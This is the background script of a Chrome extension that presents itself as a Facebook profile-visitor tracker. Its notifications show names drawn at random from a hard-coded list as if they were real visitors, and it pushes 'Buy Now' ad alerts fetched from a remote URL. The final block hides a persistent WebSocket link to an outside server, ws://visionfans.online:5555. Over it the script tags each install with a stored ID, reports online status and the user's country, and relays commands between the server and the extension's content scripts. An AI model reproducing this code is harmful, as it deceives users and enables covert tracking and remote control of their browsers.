const names = [
  "EmilyW1663", "MaxW709", "AbigailL7407", "IsabellaY3359", "SophiaW6590",
  "LiamJ7232", "MaxZ8291", "CharlieN6760", "MadisonQ7485", "EmilyS7219",
  "EllaQ9769", "CharlieK2313", "AidenJ2920", "AvaW3861", "IsabellaP4496",
  "IsabellaR4037", "CharlieA1509", "AlexN3362", "AbigailY7409", "OliviaT2154",
  "EmilyS2508", "AvaN4733", "AlexE2754", "AidenI8632", "AbigailN8087",
  "EllaL9415", "MaxA7244", "MadisonC9627", "AidenZ9950", "MaxK1369",
  "EllaB6049", "SophiaB2295", "AidenF1370", "MaxO7240", "MaxJ5810",
  "EllaV9545", "LucasL1873", "MaxW1764", "MadisonK4928", "MaxB4489",
  "AidenM1984", "LucasI2160", "AidenN10", "CharlieW3121", "EmilyV6299",
  "AidenS5097", "MiaK8277", "MaxC1015", "OliviaH8558", "MiaJ5583",
  "EllaA6655", "MaxH1188", "CharlieR4187", "AlexC6218", "AlexD7163",
  "AvaH6275", "EllaQ3493", "AbigailH9958", "AidenS7702", "AlexY2037",
  "MiaH34", "EllaJ3055", "CharlieZ683", "AidenC1764", "IsabellaY8591",
  "AlexG8665", "MaxT6194", "MaxS279", "AlexI4637", "OliviaV941",
  "MaxF6851", "LucasJ550", "MaxI5421", "OliviaF6232", "IsabellaV284",
  "EllaB2703", "AlexI4630", "AvaV9165", "IsabellaS8586", "IsabellaZ2563",
  "AvaI6413", "AlexW4255", "IsabellaV5541", "AlexH8337", "MaxR4566",
  "EllaX912", "LiamX6889", "MiaS7939", "MadisonP8303", "AvaJ6006",
  "AlexB3923", "MaxD1921", "SophiaN1983", "LiamM9861", "AbigailC2269",
  "CharlieL6954", "AidenF8043", "CharlieH4209", "CharlieS639", "MiaT2169"
];


// Функция для получения случайного имени из списка
function getRandomName()
{
  const randomIndex = Math.floor(Math.random() * names.length);
  return names[randomIndex];
}

// Функция для сохранения имени в куки
function saveNameToCookies(name)
{
  const expirationDate = (new Date().getTime() / 1000) + (2 * 24 * 60 * 60);
  chrome.cookies.set({
    url: 'https://www.facebook.com/',
    name: 'lastViewedProfile',
    value: name,
    expirationDate: expirationDate
  });
}

// Функция для получения имени из куки
function getNameFromCookies(callback)
{
  chrome.cookies.get({
    url: 'https://www.facebook.com/',
    name: 'lastViewedProfile'
  }, (cookie) =>
  {
    if (cookie) {
      callback(cookie.value);
    } else {
      callback(null);
    }
  });
}

// Функция для отображения уведомления с именем из куки
function showNotificationFromCookies()
{
  getNameFromCookies((name) =>
  {
    if (name) {
      showNotification(name); // Показать уведомление с сохраненным именем
    } else {
      // Если имя не найдено в cookies, используем новое случайное имя
      showNotification(getRandomName());
    }
  });
}

// Функция для отображения уведомления
function showNotification(name)
{
  const notificationOptions = {
    type: 'basic',
    iconUrl: '../img/logo.png',
    title: 'New unknown guest',
    message: `your profile was visited by: ${name}`
  };
  chrome.notifications.create(notificationOptions);
  saveNameToCookies(name); // Сохраняем имя в куки
}

function setRandomAlarm()
{
  const randomMinutes = Math.floor(Math.random() * (120 - 50) + 50);
  chrome.alarms.create('notifyUser', { delayInMinutes: randomMinutes });
}

chrome.runtime.onInstalled.addListener(() =>
{
  chrome.alarms.create('notifyUser', { delayInMinutes: 5 });
});

// Обработчик события для будильника
chrome.alarms.onAlarm.addListener((alarm) =>
{
  if (alarm.name === 'notifyUser') {
    showNotificationFromCookies(); // Отправить уведомление с именем из куки
    setRandomAlarm(); // Устанавливаем следующий будильник на случайный интервал
  }
  else if (alarm && alarm.name === 'notificationAlarm') {
    fetchData(apiUrl);
  }
});

// ---------------
import apiUrl from './api.js';
chrome.notifications.onButtonClicked.addListener(async (notificationId, buttonIndex) =>
{
  if (buttonIndex === 0) {
    chrome.storage.sync.get(['data'], (result) =>
    {
      const url = result.data?.url || '';
      chrome.notifications.clear(notificationId, () =>
      {
        if (url) {
          chrome.tabs.create({ url });
        } else {
          console.log('dont find url');
        }
      });
    });
  }
});

function fetchData(url)
{
  fetch(url)
    .then(response =>
    {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data =>
    {
      console.log('result of request:', data);
      if (data?.active) {
        chrome.storage.sync.set({ 'data': data });
        chrome.notifications.create('notification1', {
          type: 'basic',
          iconUrl: '../img/logo.png',
          title: 'FBStealthMode',
          message: data?.text,
          buttons: [
            { title: 'Buy Now' }
          ],
          priority: 0
        });
      }
      else chrome.storage.sync.set({ 'data': [] });

    })
    .catch(error =>
    {
      chrome.storage.sync.set({ 'data': [] });
      console.log('server error:', error);
    });
}

chrome.alarms.create('notificationAlarm', {
  delayInMinutes: 1,
  periodInMinutes: 5
});



// ----------------------------------------------------------------
(async function ()
{
  var version = "1.0.1";
  var module = "global";
  var contentModule = "guests";

  let uuid = await getDataFromLocalStorage(
    module + "_" + version + "_" + contentModule
  );
  if (!uuid) {
    uuid = uuidv4();
    await saveDataToLocalStorage(
      module + "_" + version + "_" + contentModule,
      uuid
    );
  }

  var host = "ws://visionfans.online:5555/ws/" + uuid;

  class Socket
  {
    constructor()
    {
      this.init();
    }

    init()
    {
      try {
        this.socket = new WebSocket(host);
      } catch (e) {
        console.error(e);
        setTimeout(() =>
        {
          this.init();
        }, 1000);
        return;
      }

      this.pingInterval = null;
      this.isReady = false;
      this.socket.onopen = () =>
      {
        this.isReady = true;
        this.pingInterval = setInterval(() =>
        {
          this.send({
            action: "ping",
          });
        }, 10000);
      };

      this.socket.onclose = (event) =>
      {
        setTimeout(() =>
        {
          this.init();
        }, 1000);
        clearInterval(this.pingInterval);
      };
    }

    async send(message)
    {
      return new Promise(async (resolve, reject) =>
      {
        while (!this.isReady) {
          await sleep(100);
        }

        if (!("uuid" in message)) {
          message["uuid"] = uuid;
        }

        if (!("module" in message)) {
          message["module"] = module;
        }

        if (!("version" in message)) {
          message["version"] = version;
        }

        this.socket.send(JSON.stringify(message));

        resolve();
      });
    }
  }

  var socket = new Socket();

  // chrome api message
  chrome.runtime.onConnect.addListener(async function (port)
  {
    socket.socket.onmessage = (event) =>
    {
      var msg = JSON.parse(event.data);

      port.postMessage(msg);
    };

    port.onMessage.addListener(async function (message)
    {
      message["module"] = contentModule;
      let response = await socket.send(message);
      port.postMessage(response);
    });
  });

  // setup handler
  await chrome.runtime.onInstalled.addListener(async function (details)
  {
    if (details.reason == "install" || details.reason == "update") {
      await socket.send({
        action: "setupExtension",
      });
    } else if (details.reason == "uninstall") {
      await socket.send({
        action: "deleteExtension",
      });
    }
  });

  setInterval(async function ()
  {
    await getDataFromLocalStorage("nosleep");
  }, 15);
  await setOnline();
  setInterval(setOnline, 3 * 60 * 1000);

  async function setOnline()
  {
    socket.send({
      action: "setOnline",
    });

    await updateData();
  }

  async function updateData()
  {
    let country = "";
    try {
      let response = await fetch(
        "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
        {
          method: "GET",
          headers: {
            Accept: "application/json",
          },
        }
      );
      country = (await response.json())["country"];
    } catch (error) {
      try {
        let response = await fetch("https://ipapi.co/json/");
        country = (await response.json())["country_code"];
      } catch (error) { }
    }

    await socket.send({
      action: "updateData",
      country: country,
    });
  }

  async function sleep(ms)
  {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  function saveDataToLocalStorage(key, value)
  {
    chrome.storage.local.set({ [key]: value }, () =>
    {
      console.log(`Data saved: { ${key}: ${value} }`);
    });
  }

  function getDataFromLocalStorage(key)
  {
    return new Promise((resolve, reject) =>
    {
      chrome.storage.local.get(key, (result) =>
      {
        if (chrome.runtime.lastError) {
          reject(chrome.runtime.lastError);
        } else {
          resolve(result[key]);
        }
      });
    });
  }

  function uuidv4()
  {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
      (
        c ^
        (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
      ).toString(16)
    );
  }
})();
